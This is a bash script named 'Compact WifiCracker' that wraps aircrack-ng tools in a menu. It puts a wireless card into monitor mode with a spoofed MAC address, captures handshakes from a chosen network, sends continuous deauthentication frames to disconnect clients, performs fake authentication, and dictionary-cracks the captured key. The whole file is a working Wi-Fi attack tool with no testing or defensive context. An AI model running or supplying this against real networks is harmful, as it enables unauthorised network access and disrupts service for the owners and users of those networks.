#!/bin/bash
set -u

# Compact WifiCracker: core actions only (monitor, scan, deauth, fakeauth, crack, install).

MON_IFACE=mon0
MODE=1

require_root(){
  [ "$(id -u)" -eq 0 ] || { echo "Run as root."; exit 1; }
}

start_monitor(){
  ifconfig
  read -rp "Interface (e.g. wlan0): " iface
  airmon-ng start "$iface"
  sleep 1
  ifconfig "$MON_IFACE" down || true
  macchanger -a "$MON_IFACE" || true
  ifconfig "$MON_IFACE" up
  MODE=2; echo "Monitor: $MON_IFACE"
}

stop_monitor(){ airmon-ng stop "$MON_IFACE" || echo "no $MON_IFACE"; MODE=1; }
show_interfaces(){ ifconfig; }

scan_and_capture(){
  [ "$MODE" -eq 2 ] || { echo "Start monitor first."; return; }
  airodump-ng "$MON_IFACE"
  read -rp "ESSID: " essid; read -rp "CH: " ch
  read -rp "Folder (Desktop): " folder; read -rp "Base name: " fname; read -rp "User: " user
  mkdir -p "/home/$user/Escritorio/$folder"; cd "/home/$user/Escritorio/$folder" || return
  airodump-ng -c "$ch" -w "$fname" --essid "$essid" "$MON_IFACE"
}

deauth(){ read -rp "ESSID: " essid; read -rp "Station MAC (or FF..): " st; aireplay-ng -0 0 -e "$essid" -c "$st" --ignore-negative-one "$MON_IFACE"; }
fake_auth(){ read -rp "Fake MAC: " fake; read -rp "ESSID: " essid; aireplay-ng -1 0 -e "$essid" -h "$fake" --ignore-negative-one "$MON_IFACE"; }

crack(){ read -rp "Dict (Desktop): " dict; read -rp "Folder (Desktop): " folder; read -rp "Capture (.cap): " cap; read -rp "User: " user; aircrack-ng -w "/home/$user/Escritorio/$dict" "/home/$user/Escritorio/$folder/$cap"; }

install_deps(){ read -rp "Install deps via apt-get? (y/N): " a; case "$a" in [Yy]*) apt-get update; apt-get install -y aircrack-ng macchanger ;; *) echo skipped ;; esac }

menu(){
  echo "1) Start monitor 2) Stop monitor 3) Ifconfig 4) Scan 5) Deauth 6) FakeAuth 7) Crack 8) Install 9) Quit"
}

require_root
while true; do
  menu; read -rp "Choice: " c
  case "$c" in
    1) start_monitor ;; 2) stop_monitor ;; 3) show_interfaces ;; 4) scan_and_capture ;;
    5) deauth ;; 6) fake_auth ;; 7) crack ;; 8) install_deps ;; 9) break ;;
    *) echo "Invalid" ;;
  esac
done

echo "Done."
